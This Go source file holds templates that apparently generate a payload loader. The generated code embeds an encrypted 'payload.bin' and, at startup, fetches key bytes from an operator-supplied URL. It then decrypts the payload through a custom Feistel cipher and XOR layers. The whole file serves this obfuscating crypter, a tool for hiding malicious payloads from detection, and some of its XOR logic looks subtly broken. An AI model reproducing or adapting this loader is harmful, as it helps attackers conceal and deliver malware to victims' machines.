package main

const base = `package main
import (
	"bufio"
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	_ "embed"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
)
//go:embed payload.bin
var payloadBin []byte
var stringPayload string
var DecryptedPayload []byte

	var Payload []byte
`

const funcs = `
func xor(f []byte, key string) []byte {
	buf := make([]byte, 1)
	bufw := []byte{}
	reader := bytes.NewReader(f)
	for {
		n, err := reader.Read(buf)
		if err != nil {
			if err != io.EOF {
				log.Fatal(err)
			}
			break
		}
		bite := byte(key[n%(len(key))])
		writebuf := make([]byte, 0)
		writebuf = append(writebuf, bite)
		xord, err := XORBytes(writebuf, buf[0:n])
		bufw = append(bufw, xord[0])
	}
	return bufw
}

func bytesXor(data []byte, key []byte) []byte {
	buf := make([]byte, 1)
	var bufw []byte
	f := bytes.NewReader(data)
	reader := bufio.NewReader(f)
	for {
		n, err := reader.Read(buf)
		if err != nil {
			if err != io.EOF {
				log.Fatal(err)
			}
			break
		}
		bite := key[n%(len(key))]
		writebuf := make([]byte, 0)
		writebuf = append(writebuf, bite)
		xord, err := XORBytes(writebuf, buf[0:n])
		bufw = append(bufw, xord[0])
	}
	return bufw
}

func sieveOfEratosthenes(N int) (primes []int) {
	b := make([]bool, N)
	for i := 2; i < N; i++ {
		if b[i] == true {
			continue
		}
		primes = append(primes, i)
		for k := i * i; k < N; k += i {
			b[k] = true
		}
	}
	return
}

func XORBytes(a, b []byte) ([]byte, error) {
	if len(a) != len(b) {
		return nil, fmt.Errorf("length of byte slices is not equivalent")
	}

	buf := make([]byte, len(a))

	for i := range a {
		buf[i] = a[i] ^ b[i]
	}

	return buf, nil
}

const BLOCK_SIZE = 64

type FeistelCipher struct {
	keys [][]byte
}

// New tries to read the keys from a local file (.feistelkeys). If
// if fails, it generates new keys and creates that file
func New(keys [][]byte) *FeistelCipher {

	f := FeistelCipher{keys: keys}
	return &f
}

func encryptBlock(block []byte, keys [][]byte) []byte {
	rounds := len(keys)
	l := block[:len(block)/2]
	r := block[(len(block) / 2):]

	for i := 1; i < rounds; i++ {
		l, r = r, roundFunc(l, r, keys[i])
	}

	return append(l, r...)
}

func decryptBlock(block []byte, keys [][]byte) []byte {
	rounds := len(keys)
	l := block[:len(block)/2]
	r := block[(len(block) / 2):]

	for i := rounds - 1; i > 0; i-- {
		r, l = l, roundFunc(r, l, keys[i])
	}
	return append(l, r...)
}

func roundFunc(l []byte, r []byte, key []byte) []byte {
	hmacObj := hmac.New(sha256.New, key)
	hmacObj.Write(r)
	hmacSum := hmacObj.Sum(nil)
	data := bytesXor(l, hmacSum)

	return data
}

func pad(msg []byte) []byte {
	msgLength := len(msg)
	max := BLOCK_SIZE
	for msgLength%BLOCK_SIZE != 0 {
		msg = append(msg, byte(max))
		msgLength = len(msg)
		max--
	}
	return msg
}

func stripPadding(msg []byte) []byte {
	paddingLength := BLOCK_SIZE + 1 - msg[len(msg)-1]
	messageLength := len(msg) - int(paddingLength)
	return msg[:messageLength]
}

func (f *FeistelCipher) Encrypt(msg []byte) []byte {
	paddedMsg := pad(msg)
	out := make([]byte, len(paddedMsg))
	for i := 0; i < len(paddedMsg); i += BLOCK_SIZE {
		msgBlock := paddedMsg[i : i+BLOCK_SIZE]
		encryptedBlock := encryptBlock(msgBlock, f.keys)
		for j := 0; j < BLOCK_SIZE; j++ {
			out[i+j] = encryptedBlock[j]
		}
	}
	return out
}

func (f *FeistelCipher) Decrypt(msg []byte) []byte {
	out := make([]byte, len(msg))
	for i := 0; i < len(msg); i += BLOCK_SIZE {
		msgBlock := msg[i : i+BLOCK_SIZE]
		decryptedBlock := decryptBlock(msgBlock, f.keys)
		for j := 0; j < BLOCK_SIZE; j++ {
			out[i+j] = decryptedBlock[j]
		}
	}
	return stripPadding(out)
}`

const initBlock = `
func init(){
		Payload = make([]byte, 64)
		r, _ := http.Get("%s")
		defer r.Body.Close()
		body, _ := ioutil.ReadAll(r.Body)
		`

const feistalSetup = `
		keys := make([][]byte, %d)
`

const feistalKey = `
		keys[%d] = []byte("%s")
`

const feistalInit = `
		for i := 0; i < len(keys); i++ {
		key, _ := base64.StdEncoding.DecodeString(string(keys[i]))
		keys[i] = xor(key, string(Payload))
		}
		cipher := New(keys)
		stringPayload = string(cipher.Decrypt(payloadBin))
		DecryptedPayload = xor([]byte(stringPayload), string(Payload))

`

const StringTemplate = "Payload[%d] = []byte(%s)[0]"
const IntTemplate = "Payload[%d] = body[%d]"

const end = `
}
`
